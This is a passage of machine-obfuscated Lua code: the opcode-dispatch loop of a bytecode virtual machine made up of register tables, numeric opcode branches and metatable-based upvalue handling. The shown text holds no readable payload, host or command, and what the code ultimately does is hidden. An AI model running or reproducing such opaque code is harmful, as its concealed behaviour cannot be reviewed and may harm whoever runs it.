q;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()elseif z~=200 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()end;elseif z<=206 then if z<=203 then if 201>=z then local q,x=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then x=nil else if q==1 then w[y[125]]=y[392];else n=n+1;end end else if q<=4 then if q>3 then w[y[125]]={};else y=e[n];end else if 5<q then y=e[n];else n=n+1;end end end else if q<=10 then if q<=8 then if 7<q then n=n+1;else w[y[125]][w[y[392]]]=w[y[54]];end else if 9==q then y=e[n];else w[y[125]]=y[392];end end else if q<=12 then if 12>q then n=n+1;else y=e[n];end else if 13==q then w[y[125]]=y[392];else n=n+1;end end end end else if q<=22 then if q<=18 then if q<=16 then if 15==q then y=e[n];else w[y[125]]=w[y[392]][w[y[54]]];end else if q==17 then n=n+1;else y=e[n];end end else if q<=20 then if q==19 then w[y[125]][w[y[392]]]=w[y[54]];else n=n+1;end else if q==21 then y=e[n];else w[y[125]]=y[392];end end end else if q<=26 then if q<=24 then if q~=24 then n=n+1;else y=e[n];end else if q~=26 then w[y[125]]=o[y[392]];else n=n+1;end end else if q<=28 then if q==27 then y=e[n];else x=y[125]end else if q>29 then break else w[x]=w[x]()end end end end end q=q+1 end elseif(202<z)then if not w[y[125]]then n=(n+1);else n=y[392];end;else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[125]]=w[y[392]][y[54]];end else if q~=3 then n=n+1;else y=e[n];end end else if q<=5 then if 4==q then w[y[125]]=y[392];else n=n+1;end else if 7~=q then y=e[n];else w[y[125]]=y[392];end end end else if q<=11 then if q<=9 then if q>8 then y=e[n];else n=n+1;end else if 11>q then w[y[125]]=y[392];else n=n+1;end end else if q<=13 then if 12<q then x=y[125]else y=e[n];end else if 14==q then w[x]=w[x](r(w,x+1,y[392]))else break end end end end q=q+1 end end;elseif 204>=z then w[y[125]]=h[y[392]];elseif z>205 then local q;w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=209 then if 207>=z then local q=y[125];do return w[q](r(w,q+1,y[392]))end;elseif 209~=z then local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[392];x=y[54];q=k(w,g,ba,x);w[y[125]]=q;end;elseif z<=210 then local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif z<212 then w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;else local q;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=224 then if 218>=z then if 215>=z then if z<=213 then if(w[y[125]]<w[y[54]])then n=n+1;else n=y[392];end;elseif 214==z then local q=y[125]local x,ba=j(w[q](w[q+1]))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;else local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif 216>=z then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[125]]=w[y[392]][y[54]];end else if 3~=q then n=n+1;else y=e[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if q<=6 then y=e[n];else if q~=8 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if q<=13 then if q<=10 then if q<10 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if q<=11 then n=n+1;else if q>12 then w[y[125]]=false;else y=e[n];end end end else if q<=15 then if q<15 then n=n+1;else y=e[n];end else if q<=16 then x=y[125]else if q<18 then w[x](w[x+1])else break end end end end end q=q+1 end elseif 217<z then if(y[125]<=w[y[54]])then n=n+1;else n=y[392];end;else local q=y[125];do return r(w,q,p)end;end;elseif z<=221 then if(219==z or 219>z)then w[y[125]][y[392]]=w[y[54]];elseif not(220~=z)then local q,x=0 while true do if q<=22 then if q<=10 then if q<=4 then if q<=1 then if 0==q then x=nil else w[y[125]]=w[y[392]][y[54]];end else if q<=2 then n=n+1;else if 4~=q then y=e[n];else w[y[125]]=h[y[392]];end end end else if q<=7 then if q<=5 then n=n+1;else if q<7 then y=e[n];else w[y[125]]=h[y[392]];end end else if q<=8 then n=n+1;else if 10>q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if q<=16 then if q<=13 then if q<=11 then n=n+1;else if q~=13 then y=e[n];else w[y[125]]=w[y[392]][w[y[54]]];end end else if q<=14 then n=n+1;else if q==15 then y=e[n];else w[y[125]]={};end end end else if q<=19 then if q<=17 then n=n+1;else if 18<q then w[y[125]]=w[y[392]][y[54]];else y=e[n];end end else if q<=20 then n=n+1;else if q>21 then w[y[125]][y[392]]=w[y[54]];else y=e[n];end end end end end else if q<=33 then if q<=27 then if q<=24 then if 23<q then y=e[n];else n=n+1;end else if q<=25 then w[y[125]]=h[y[392]];else if q<27 then n=n+1;else y=e[n];end end end else if q<=30 then if q<=28 then w[y[125]]=w[y[392]][y[54]];else if 29==q then n=n+1;else y=e[n];end end else if q<=31 then w[y[125]][y[392]]=w[y[54]];else if 32<q then y=e[n];else n=n+1;end end end end else if q<=39 then if q<=36 then if q<=34 then w[y[125]]=h[y[392]];else if q~=36 then n=n+1;else y=e[n];end end else if q<=37 then w[y[125]]=w[y[392]][y[54]];else if q~=39 then n=n+1;else y=e[n];end end end else if q<=42 then if q<=40 then w[y[125]][y[392]]=w[y[54]];else if q<42 then n=n+1;else y=e[n];end end else if q<=43 then x=y[125]else if q>44 then break else w[x](r(w,x+1,y[392]))end end end end end end q=q+1 end else if(w[y[125]]<w[y[54]]or w[y[125]]==w[y[54]])then n=n+1;else n=y[392];end;end;elseif z<=222 then local q=d[y[392]];local x={};local ba={};for bb=1,y[54]do n=n+1;local bc=e[n];if not(bc[686]~=346)then ba[bb-1]={w,bc[392],nil,nil};else ba[(bb-1)]={h,bc[392],nil,nil,nil};end;v[#v+1]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[125]]=b(q,x,o);elseif 224~=z then local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=230 then if(227>z or 227==z)then if z<=225 then if(not(w[y[125]]==w[y[54]]))then n=n+1;else n=y[392];end;elseif 226<z then o[y[392]]=w[y[125]];else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[125]]=o[y[392]];end else if q==2 then n=n+1;else y=e[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if q==6 then y=e[n];else w[y[125]]=h[y[392]];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=e[n];end else if q<11 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if q<=13 then if q<13 then y=e[n];else x=y[125]end else if q~=15 then w[x]=w[x](w[x+1])else break end end end end q=q+1 end end;elseif(228==z or 228>z)then local q,x=0 while true do if q<=10 then if q<=4 then if q<=1 then if q~=1 then x=nil else w[y[125]]=w[y[392]][y[54]];end else if q<=2 then n=n+1;else if 3==q then y=e[n];else w[y[125]]=h[y[392]];end end end else if q<=7 then if q<=5 then n=n+1;else if 7~=q then y=e[n];else w[y[125]]=h[y[392]];end end else if q<=8 then n=n+1;else if q~=10 then y=e[n];else w[y[125]]=h[y[392]];end end end end else if q<=15 then if q<=12 then if q~=12 then n=n+1;else y=e[n];end else if q<=13 then w[y[125]]=h[y[392]];else if q==14 then n=n+1;else y=e[n];end end end else if q<=18 then if q<=16 then w[y[125]]=w[y[392]];else if 17==q then n=n+1;else y=e[n];end end else if q<=19 then x=y[125]else if q>20 then break else w[x](r(w,x+1,y[392]))end end end end end q=q+1 end elseif z>229 then local q=y[125]w[q]=w[q](w[(q+1)])else if w[y[125]]then n=n+1;else n=y[392];end;end;elseif 233>=z then if 231>=z then w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;elseif z<233 then w[y[125]]=w[y[392]]*y[54];else local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif 234>=z then w[y[125]]=b(d[y[392]],nil,o);elseif 236>z then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif 260>=z then if 248>=z then if 242>=z then if 239>=z then if z<=237 then local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])elseif z>238 then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[392];x=y[54];q=k(w,g,ba,x);w[y[125]]=q;else w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;end;elseif z<=240 then if(w[y[125]]~=w[y[54]])then n=y[392];else n=n+1;end;elseif 242~=z then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif z<=245 then if 243>=z then local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])elseif 244==z then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q]()else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif z<=246 then local q=w[y[54]];if not q then n=(n+1);else w[y[125]]=q;n=y[392];end;elseif z>247 then local q=y[125];local x,ba,bb=w[q],w[q+1],w[q+2];local x=x+bb;w[q]=x;if bb>0 and x<=ba or bb<0 and x>=ba then n=y[392];w[q+3]=x;end;else local q=y[125]w[q](r(w,q+1,y[392]))end;elseif z<=254 then if z<=251 then if z<=249 then local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif 250==z then w[y[125]]=w[y[392]]-w[y[54]];else w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];end;elseif z<=252 then local q;w={};for x=0,u,1 do if x<i then w[x]=s[x+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif z<254 then local q=y[125]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if bc>=q then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end else if(w[y[125]]<w[y[54]])then n=n+1;else n=y[392];end;end;elseif z<=257 then if z<=255 then local q=y[125];local x=w[q];for ba=q+1,y[392]do t(x,w[ba])end;elseif z==256 then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else w[y[125]]=#w[y[392]];end;elseif z<=258 then if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;elseif z~=260 then w[y[125]]=w[y[392]]%y[54];else w={};for q=0,u,1 do if q<i then w[q]=s[q+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;end;elseif 272>=z then if 266>=z then if(263>z or 263==z)then if((261>z)or(261==z))then local q=0 while true do if(q==7 or q<7)then if(q==3 or q<3)then if(q==1 or(q<1))then if(1>q)then w[y[125]]=w[y[392]][y[54]];else n=(n+1);end else if q<3 then y=e[n];else w[y[125]][y[392]]=w[y[54]];end end else if(q<5 or q==5)then if not(5==q)then n=(n+1);else y=e[n];end else if q~=7 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end else if(q<11 or q==11)then if(q<9 or q==9)then if(not(9==q))then y=e[n];else w[y[125]]=h[y[392]];end else if(q>10)then y=e[n];else n=(n+1);end end else if(q<13 or q==13)then if q==12 then w[y[125]]=w[y[392]][y[54]];else n=(n+1);end else if(q==14 or q<14)then y=e[n];else if(not(q~=15))then if(not(w[y[125]]==w[y[54]]))then n=(n+1);else n=y[392];end;else break end end end end end q=(q+1)end elseif z>262 then w[y[125]]={r({},1,y[392])};else do return w[y[125]]end end;elseif(264==z or 264>z)then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[125]]=o[y[392]];end else if 2<q then y=e[n];else n=n+1;end end else if q<=5 then if q~=5 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if q<=6 then y=e[n];else if q>7 then n=n+1;else w[y[125]]=y[392];end end end end else if q<=13 then if q<=10 then if 10>q then y=e[n];else w[y[125]]=y[392];end else if q<=11 then n=n+1;else if 13>q then y=e[n];else w[y[125]]=y[392];end end end else if q<=15 then if 14==q then n=n+1;else y=e[n];end else if q<=16 then x=y[125]else if q~=18 then w[x]=w[x](r(w,x+1,y[392]))else break end end end end end q=q+1 end elseif not(265~=z)then local q,x,ba,bb=0 while true do if q<=10 then if q<=4 then if q<=1 then if 0<q then ba=nil else x=nil end else if q<=2 then bb=nil else if q<4 then w[y[125]]=h[y[392]];else n=n+1;end end end else if q<=7 then if q<=5 then y=e[n];else if 7~=q then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if q<=8 then y=e[n];else if q~=10 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if q<=16 then if q<=13 then if q<=11 then y=e[n];else if 13>q then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=14 then y=e[n];else if 15<q then n=n+1;else w[y[125]]=w[y[392]][y[54]];end end end else if q<=19 then if q<=17 then y=e[n];else if 19>q then bb=y[392];else ba=y[54];end end else if q<=20 then x=k(w,g,bb,ba);else if q==21 then w[y[125]]=x;else break end end end end end q=q+1 end else w[y[125]]=true;end;elseif(z<=269)then if(267>=z)then do return end;elseif z~=269 then local q=y[125]w[q](w[(q+1)])else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q<1 then x=nil else w[y[125]][y[392]]=w[y[54]];end else if 2<q then y=e[n];else n=n+1;end end else if q<=5 then if q>4 then n=n+1;else w[y[125]]={};end else if 6==q then y=e[n];else w[y[125]][y[392]]=y[54];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=e[n];end else if q~=11 then w[y[125]][y[392]]=w[y[54]];else n=n+1;end end else if q<=13 then if 12<q then x=y[125]else y=e[n];end else if 14<q then break else w[x]=w[x](r(w,x+1,y[392]))end end end end q=q+1 end end;elseif(270==z or 270>z)then local q=y[125]w[q](r(w,q+1,p))elseif 272>z then local d=d[y[392]];local q={};local x={};for ba=1,y[54]do n=(n+1);local bb=e[n];if(bb[686]==346)then x[(ba-1)]={w,bb[392],nil,nil};else x[(ba-1)]={h,bb[392],nil,nil,nil,nil};end;v[#v+1]=x;end;m(q,{['\95\95\105\110\100\101\120']=function(m,m)local m=x[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,v)local m=x[m]m[1][m[2]]=v;end;});w[y[125]]=b(d,q,o);else local d=0 while true do if d<=14 then if d<=6 then if d<=2 then if d<=0 then w={};else if d>1 then n=n+1;else for m=0,u,1 do if m<i then w[m]=s[m+1];else break;end;end;end end else if d<=4 then if d==3 then y=e[n];else w[y[125]]=h[y[392]];end else if d~=6 then n=n+1;else y=e[n];end end end else if d<=10 then if d<=8 then if d==7 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if 9==d then y=e[n];else w[y[125]]=h[y[392]];end end else if d<=12 then if d<12 then n=n+1;else y=e[n];end else if 14~=d then w[y[125]]={};else n=n+1;end end end end else if d<=21 then if d<=17 then if d<=15 then y=e[n];else if d>16 then n=n+1;else w[y[125]]={};end end else if d<=19 then if d>18 then w[y[125]][y[392]]=w[y[54]];else y=e[n];end else if 20==d then n=n+1;else y=e[n];end end end else if d<=25 then if d<=23 then if 22<d then n=n+1;else w[y[125]]=o[y[392]];end else if 25>d then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if d<=27 then if d==26 then n=n+1;else y=e[n];end else if d~=29 then if w[y[125]]then n=n+1;else n=y[392];end;else break end end end end end d=d+1 end end;elseif z<=278 then if z<=275 then if 273>=z then local d=y[125];local m=w[d];for q=d+1,y[392]do t(m,w[q])end;elseif 275~=z then if(y[125]<w[y[54]])then n=n+1;else n=y[392];end;else w[y[125]][w[y[392]]]=w[y[54]];end;elseif z<=276 then local d=y[125];local m=w[d];for q=(d+1),p do t(m,w[q])end;elseif 278~=z then w[y[125]]=y[392];else local d=y[125]local m,q=j(w[d](w[d+1]))p=q+d-1 local q=0;for v=d,p do q=q+1;w[v]=m[q];end;end;elseif z<=281 then if 279>=z then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if d<1 then m=nil else w[y[125]]=w[y[392]];end else if 2==d then n=n+1;else y=e[n];end end else if d<=5 then if d~=5 then w[y[125]]=y[392];else n=n+1;end else if d<7 then y=e[n];else w[y[125]]=y[392];end end end else if d<=11 then if d<=9 then if 9>d then n=n+1;else y=e[n];end else if 10==d then w[y[125]]=y[392];else n=n+1;end end else if d<=13 then if 12<d then m=y[125]else y=e[n];end else if 14==d then w[m]=w[m](r(w,m+1,y[392]))else break end end end end d=d+1 end elseif 281>z then local d;local m;w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={r({},1,y[392])};n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];m=y[125];d=w[m];for q=m+1,y[392]do t(d,w[q])end;else local d;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];d=y[125]w[d]=w[d]()end;elseif z<=282 then local d;local m;local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];q=y[125]m={w[q](w[q+1])};d=0;for v=q,y[54]do d=d+1;w[v]=m[d];end elseif 283<z then local d;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];d=y[125]w[d]=w[d](r(w,d+1,y[392]))else w[y[125]]=w[y[392]]-y[54];end;elseif z<=331 then if 307>=z then if z<=295 then if(z<289 or z==289)then if(286==z or 286>z)then if not(z~=285)then local d=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0==d then w[y[125]][y[392]]=y[54];else n=n+1;end else if d<=2 then y=e[n];else if d~=4 then w[y[125]]={};else n=n+1;end end end else if d<=6 then if d<6 then y=e[n];else w[y[125]][y[392]]=w[y[54]];end else if d<=7 then n=n+1;else if d>8 then w[y[125]]=h[y[392]];else y=e[n];end end end end else if d<=14 then if d<=11 then if d>10 then y=e[n];else n=n+1;end else if d<=12 then w[y[125]]=w[y[392]][y[54]];else if d~=14 then n=n+1;else y=e[n];end end end else if d<=16 then if 16>d then w[y[125]][y[392]]=w[y[54]];else n=n+1;end else if d<=17 then y=e[n];else if 18<d then break else w[y[125]][y[392]]=w[y[54]];end end end end end d=d+1 end else local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if d>0 then w[y[125]]=h[y[392]];else m=nil end else if d~=3 then n=n+1;else y=e[n];end end else if d<=5 then if d>4 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if d==6 then y=e[n];else w[y[125]]=y[392];end end end else if d<=11 then if d<=9 then if d>8 then y=e[n];else n=n+1;end else if d<11 then w[y[125]]=y[392];else n=n+1;end end else if d<=13 then if 13~=d then y=e[n];else m=y[125]end else if 15>d then w[m]=w[m](r(w,m+1,y[392]))else break end end end end d=d+1 end end;elseif 287>=z then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if d>0 then w[y[125]]=w[y[392]][y[54]];else m=nil end else if d>2 then y=e[n];else n=n+1;end end else if 